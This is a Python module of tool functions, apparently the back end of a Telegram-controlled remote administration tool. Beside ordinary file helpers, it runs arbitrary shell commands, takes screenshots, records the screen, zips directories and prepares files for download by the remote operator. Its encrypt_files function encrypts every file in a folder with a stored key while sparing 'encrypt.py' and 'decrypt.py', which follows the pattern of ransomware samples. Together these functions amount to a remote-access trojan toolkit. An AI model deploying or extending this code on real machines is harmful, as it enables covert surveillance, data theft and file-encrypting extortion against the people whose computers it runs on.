import os
import shutil
import subprocess
import time
from pathlib import Path
from typing import Union, List, Dict, Optional
import pyautogui
import cv2
import numpy as np
from cryptography.fernet import Fernet

try:
    import mss  # type: ignore
except ImportError:  # pragma: no cover - optional dependency fallback
    mss = None


def get_cwd() -> dict:
    """Get the current working directory.
    
    Returns:
        dict: Contains status and current working directory path
    """
    try:
        cwd = os.getcwd()
        return {
            "status": "success",
            "cwd": cwd,
            "message": f"Current directory: {cwd}"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to get current directory: {str(e)}"
        }


def chdir(directory: str) -> dict:
    """Change the current working directory.
    
    Args:
        directory (str): Path to the directory to change to
        
    Returns:
        dict: Contains status and new current directory
    """
    try:
        os.chdir(directory)
        return {
            "status": "success",
            "cwd": os.getcwd(),
            "message": f"Changed directory to: {os.getcwd()}"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to change directory: {str(e)}"
        }


def list_directory(directory: Optional[str]) -> dict:
    """List all files and folders in the specified directory.
    
    Args:
        directory (str, optional): Directory path to list. Uses current directory if None.
        
    Returns:
        dict: Contains status, list of files and folders
    """
    try:
        path = directory if directory else os.getcwd()
        items = os.listdir(path)
        
        files = []
        folders = []
        
        for item in items:
            full_path = os.path.join(path, item)
            if os.path.isdir(full_path):
                folders.append(item)
            else:
                files.append(item)
        
        return {
            "status": "success",
            "path": path,
            "folders": folders,
            "files": files,
            "message": f"Found {len(folders)} folders and {len(files)} files in {path}"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to list directory: {str(e)}"
        }


def read_file(file_path: str) -> dict:
    """Read the contents of a file.
    
    Args:
        file_path (str): Path to the file to read
        
    Returns:
        dict: Contains status and file content
    """
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
        return {
            "status": "success",
            "file_path": file_path,
            "content": content,
            "message": f"Successfully read file: {file_path}"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to read file: {str(e)}"
        }


def create_file(file_path: str, content: Optional[str]) -> dict:
    """Create a new file with specified content.
    
    Args:
        file_path (str): Path where the file should be created
        content (str, optional): Content to write to the file
        
    Returns:
        dict: Contains status and file path
    """
    try:
        # Create parent directories if they don't exist
        Path(file_path).parent.mkdir(parents=True, exist_ok=True)
        
        file_content = content if content is not None else ""

        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(file_content)
        
        return {
            "status": "success",
            "file_path": file_path,
            "message": f"Successfully created file: {file_path}"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to create file: {str(e)}"
        }


def write_file(file_path: str, content: str) -> dict:
    """Write content to an existing file (overwrites existing content).
    
    Args:
        file_path (str): Path to the file
        content (str): Content to write
        
    Returns:
        dict: Contains status message
    """
    try:
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(content)
        
        return {
            "status": "success",
            "file_path": file_path,
            "message": f"Successfully wrote to file: {file_path}"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to write to file: {str(e)}"
        }


def delete_file(file_path: str) -> dict:
    """Delete a file.
    
    Args:
        file_path (str): Path to the file to delete
        
    Returns:
        dict: Contains status message
    """
    try:
        os.remove(file_path)
        return {
            "status": "success",
            "message": f"Successfully deleted file: {file_path}"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to delete file: {str(e)}"
        }


def delete_directory(dir_path: str) -> dict:
    """Delete a directory and all its contents.
    
    Args:
        dir_path (str): Path to the directory to delete
        
    Returns:
        dict: Contains status message
    """
    try:
        shutil.rmtree(dir_path)
        return {
            "status": "success",
            "message": f"Successfully deleted directory: {dir_path}"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to delete directory: {str(e)}"
        }


def create_directory(dir_path: str) -> dict:
    """Create a new directory.
    
    Args:
        dir_path (str): Path where the directory should be created
        
    Returns:
        dict: Contains status and directory path
    """
    try:
        os.makedirs(dir_path, exist_ok=True)
        return {
            "status": "success",
            "dir_path": dir_path,
            "message": f"Successfully created directory: {dir_path}"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to create directory: {str(e)}"
        }


def copy_file(source: str, destination: str) -> dict:
    """Copy a file from source to destination.
    
    Args:
        source (str): Source file path
        destination (str): Destination file path
        
    Returns:
        dict: Contains status message
    """
    try:
        shutil.copy2(source, destination)
        return {
            "status": "success",
            "message": f"Successfully copied {source} to {destination}"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to copy file: {str(e)}"
        }


def move_file(source: str, destination: str) -> dict:
    """Move or rename a file.
    
    Args:
        source (str): Source file path
        destination (str): Destination file path
        
    Returns:
        dict: Contains status message
    """
    try:
        shutil.move(source, destination)
        return {
            "status": "success",
            "message": f"Successfully moved {source} to {destination}"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to move file: {str(e)}"
        }


def file_exists(file_path: str) -> dict:
    """Check if a file or directory exists.
    
    Args:
        file_path (str): Path to check
        
    Returns:
        dict: Contains status and existence check result
    """
    try:
        exists = os.path.exists(file_path)
        return {
            "status": "success",
            "exists": exists,
            "message": f"Path {'exists' if exists else 'does not exist'}: {file_path}"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to check path existence: {str(e)}"
        }


def execute_command(command: str) -> dict:
    """Execute a shell command and return the output.
    
    Args:
        command (str): Command to execute
        
    Returns:
        dict: Contains status, output, and error (if any)
    """
    try:
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        output, error = process.communicate()
        
        return {
            "status": "success" if process.returncode == 0 else "error",
            "output": output.strip(),
            "error": error.strip() if error else None,
            "return_code": process.returncode,
            "message": f"Command executed: {command}"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to execute command: {str(e)}"
        }


def change_file_permissions(file_path: str, mode: str) -> dict:
    """Change file permissions (chmod).
    
    Args:
        file_path (str): Path to the file
        mode (str): Permission mode in octal format (e.g., '755')
        
    Returns:
        dict: Contains status message
    """
    try:
        permission = int(mode, 8)
        os.chmod(file_path, permission)
        return {
            "status": "success",
            "message": f"Successfully changed permissions of {file_path} to {mode}"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to change permissions: {str(e)}"
        }


def encrypt_files(directory: Optional[str]) -> dict:
    """Encrypt all files in the specified directory (excluding encryption key and script).
    
    Args:
        directory (str, optional): Directory containing files to encrypt. Uses current directory if None.
        
    Returns:
        dict: Contains status and encryption details
    """
    try:
        dir_path = directory if directory else os.getcwd()
        files = []
        
        for file in os.listdir(dir_path):
            full_path = os.path.join(dir_path, file)
            if file not in ["secretkey.key", "encrypt.py", "decrypt.py"] and os.path.isfile(full_path):
                files.append(full_path)
        
        # Generate or load encryption key
        key_path = os.path.join(dir_path, "secretkey.key")
        if not os.path.exists(key_path):
            key = Fernet.generate_key()
            with open(key_path, "wb") as key_file:
                key_file.write(key)
        else:
            with open(key_path, "rb") as key_file:
                key = key_file.read()
        
        # Encrypt files
        encrypted_count = 0
        for file_path in files:
            try:
                with open(file_path, "rb") as f:
                    content = f.read()
                encrypted_content = Fernet(key).encrypt(content)
                with open(file_path, "wb") as f:
                    f.write(encrypted_content)
                encrypted_count += 1
            except Exception as e:
                continue
        
        return {
            "status": "success",
            "encrypted_files": encrypted_count,
            "total_files": len(files),
            "message": f"Successfully encrypted {encrypted_count} out of {len(files)} files in {dir_path}"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to encrypt files: {str(e)}"
        }


def decrypt_files(directory: Optional[str]) -> dict:
    """Decrypt all encrypted files in the specified directory.
    
    Args:
        directory (str, optional): Directory containing files to decrypt. Uses current directory if None.
        
    Returns:
        dict: Contains status and decryption details
    """
    try:
        dir_path = directory if directory else os.getcwd()
        files = []
        
        for file in os.listdir(dir_path):
            full_path = os.path.join(dir_path, file)
            if file not in ["secretkey.key", "encrypt.py", "decrypt.py"] and os.path.isfile(full_path):
                files.append(full_path)
        
        # Load decryption key
        key_path = os.path.join(dir_path, "secretkey.key")
        with open(key_path, "rb") as key_file:
            key = key_file.read()
        
        # Decrypt files
        decrypted_count = 0
        for file_path in files:
            try:
                with open(file_path, "rb") as f:
                    content = f.read()
                decrypted_content = Fernet(key).decrypt(content)
                with open(file_path, "wb") as f:
                    f.write(decrypted_content)
                decrypted_count += 1
            except Exception as e:
                continue
        
        return {
            "status": "success",
            "decrypted_files": decrypted_count,
            "total_files": len(files),
            "message": f"Successfully decrypted {decrypted_count} out of {len(files)} files in {dir_path}"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to decrypt files: {str(e)}"
        }


def capture_screenshot(save_path: Optional[str]) -> dict:
    """Capture a screenshot of the current screen.
    
    Args:
        save_path (str, optional): Path where the screenshot should be saved
        
    Returns:
        dict: Contains status and file path
    """
    try:
        path = save_path if save_path else "screenshot.png"

        if mss is not None:
            with mss.mss() as sct:
                monitor = sct.monitors[1]
                raw_img = sct.grab(monitor)
                frame = np.array(raw_img)
                frame_bgr = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                cv2.imwrite(path, frame_bgr)
        else:
            screenshot = pyautogui.screenshot()
            screenshot.save(path)

        return {
            "status": "success",
            "file_path": path,
            "message": f"Screenshot saved to: {path}"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to capture screenshot: {str(e)}"
        }


def record_screen(duration: int, output_file: Optional[str] = None) -> dict:
    """Record the screen for a specified duration.
    
    Args:
        duration (int): Duration in seconds to record
        output_file (str, optional): Output video file path
        
    Returns:
        dict: Contains status and file path
    """
    try:
        if mss is None:
            return {
                "status": "error",
                "message": (
                    "Screen recording requires the optional 'mss' package. "
                    "Install it with 'pip install mss' and try again."
                )
            }

        codec = cv2.VideoWriter_fourcc(*"mp4v")
        fps = 10.0

        file_path = output_file if output_file else "recording.mp4"

        with mss.mss() as sct:
            monitor = sct.monitors[1]
            resolution = (monitor["width"], monitor["height"])
            out = cv2.VideoWriter(file_path, codec, fps, resolution)

            frames_to_capture = int(duration * fps)
            captured_frames = 0
            start_time = time.time()

            while captured_frames < frames_to_capture:
                raw_img = sct.grab(monitor)
                frame = np.array(raw_img)
                frame_bgr = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                out.write(frame_bgr)
                captured_frames += 1

                expected_time = captured_frames / fps
                elapsed = time.time() - start_time
                sleep_duration = expected_time - elapsed
                if sleep_duration > 0:
                    time.sleep(sleep_duration)

        out.release()
        cv2.destroyAllWindows()

        return {
            "status": "success",
            "file_path": file_path,
            "duration": duration,
            "frames": captured_frames,
            "message": f"Screen recorded for {duration} seconds and saved to: {file_path}"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to record screen: {str(e)}"
        }


def get_file_info(file_path: str) -> dict:
    """Get detailed information about a file.
    
    Args:
        file_path (str): Path to the file
        
    Returns:
        dict: Contains status and file information
    """
    try:
        stat_info = os.stat(file_path)
        return {
            "status": "success",
            "file_path": file_path,
            "size_bytes": stat_info.st_size,
            "size_mb": round(stat_info.st_size / (1024 * 1024), 2),
            "modified_time": time.ctime(stat_info.st_mtime),
            "created_time": time.ctime(stat_info.st_ctime),
            "is_file": os.path.isfile(file_path),
            "is_directory": os.path.isdir(file_path),
            "message": f"File info retrieved for: {file_path}"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to get file info: {str(e)}"
        }


def batch_rename_files(directory: str, old_name: str, new_name_prefix: str) -> dict:
    """Batch rename all files in a directory with a new prefix.
    
    Args:
        directory (str): Directory containing files to rename
        old_name (str): Current name pattern (not used, kept for compatibility)
        new_name_prefix (str): New name prefix for files
        
    Returns:
        dict: Contains status and rename details
    """
    try:
        files = os.listdir(directory)
        renamed_count = 0
        
        for index, file in enumerate(files):
            full_path = os.path.join(directory, file)
            if os.path.isfile(full_path):
                file_ext = os.path.splitext(file)[1]
                new_name = f"{new_name_prefix}{index}{file_ext}"
                new_path = os.path.join(directory, new_name)
                os.rename(full_path, new_path)
                renamed_count += 1
            elif os.path.isdir(full_path):
                new_name = f"{new_name_prefix}{index}"
                new_path = os.path.join(directory, new_name)
                os.rename(full_path, new_path)
                renamed_count += 1
        
        return {
            "status": "success",
            "renamed_count": renamed_count,
            "message": f"Successfully renamed {renamed_count} items in {directory}"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to batch rename files: {str(e)}"
        }


def download_file(file_path: str) -> dict:
    """Prepare a file for download by returning its path.
    This function validates that the file exists and is accessible.
    The actual file transfer will be handled by the Telegram bot.
    
    Args:
        file_path (str): Path to the file to download
        
    Returns:
        dict: Contains status, file path, and metadata for download
    """
    try:
        if not os.path.exists(file_path):
            return {
                "status": "error",
                "message": f"File not found: {file_path}"
            }
        
        if not os.path.isfile(file_path):
            return {
                "status": "error",
                "message": f"Path is not a file: {file_path}"
            }
        
        stat_info = os.stat(file_path)
        size_mb = round(stat_info.st_size / (1024 * 1024), 2)
        
        return {
            "status": "success",
            "file_path": file_path,
            "file_name": os.path.basename(file_path),
            "size_mb": size_mb,
            "size_bytes": stat_info.st_size,
            "message": f"File ready for download: {file_path} ({size_mb} MB)"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to prepare file for download: {str(e)}"
        }


def download_directory(directory_path: str, output_zip: Optional[str] = None) -> dict:
    """Create a zip archive of a directory for download.
    
    Args:
        directory_path (str): Path to the directory to download
        output_zip (str, optional): Output zip file name. Defaults to directory name + .zip
        
    Returns:
        dict: Contains status and zip file path
    """
    try:
        if not os.path.exists(directory_path):
            return {
                "status": "error",
                "message": f"Directory not found: {directory_path}"
            }
        
        if not os.path.isdir(directory_path):
            return {
                "status": "error",
                "message": f"Path is not a directory: {directory_path}"
            }
        
        # Determine output zip name
        if output_zip is None:
            dir_name = os.path.basename(directory_path.rstrip('/\\'))
            output_zip = f"{dir_name}.zip"
        
        # Create zip archive
        shutil.make_archive(
            output_zip.replace('.zip', ''),
            'zip',
            directory_path
        )
        
        zip_path = output_zip if output_zip.endswith('.zip') else f"{output_zip}.zip"
        stat_info = os.stat(zip_path)
        size_mb = round(stat_info.st_size / (1024 * 1024), 2)
        
        return {
            "status": "success",
            "file_path": zip_path,
            "directory": directory_path,
            "size_mb": size_mb,
            "message": f"Directory archived for download: {zip_path} ({size_mb} MB)"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to archive directory: {str(e)}"
        }


def list_files_in_directory(directory_path: str) -> dict:
    """List all files in a directory with detailed information.
    Useful before downloading to see what files exist.
    
    Args:
        directory_path (str): Path to the directory to list
        
    Returns:
        dict: Contains list of files with sizes
    """
    try:
        if not os.path.exists(directory_path):
            return {
                "status": "error",
                "message": f"Directory not found: {directory_path}"
            }
        
        if not os.path.isdir(directory_path):
            return {
                "status": "error",
                "message": f"Path is not a directory: {directory_path}"
            }
        
        items = []
        for item_name in os.listdir(directory_path):
            item_path = os.path.join(directory_path, item_name)
            stat_info = os.stat(item_path)
            
            item_info = {
                "name": item_name,
                "type": "directory" if os.path.isdir(item_path) else "file",
                "size_bytes": stat_info.st_size if os.path.isfile(item_path) else 0,
                "size_mb": round(stat_info.st_size / (1024 * 1024), 2) if os.path.isfile(item_path) else 0,
                "modified": time.ctime(stat_info.st_mtime)
            }
            items.append(item_info)
        
        # Sort: directories first, then files
        items.sort(key=lambda x: (x["type"] != "directory", x["name"]))
        
        return {
            "status": "success",
            "directory": directory_path,
            "items": items,
            "total_items": len(items),
            "message": f"Found {len(items)} items in {directory_path}"
        }
    except Exception as e:
        return {
            "status": "error",
            "message": f"Failed to list directory: {str(e)}"
        }
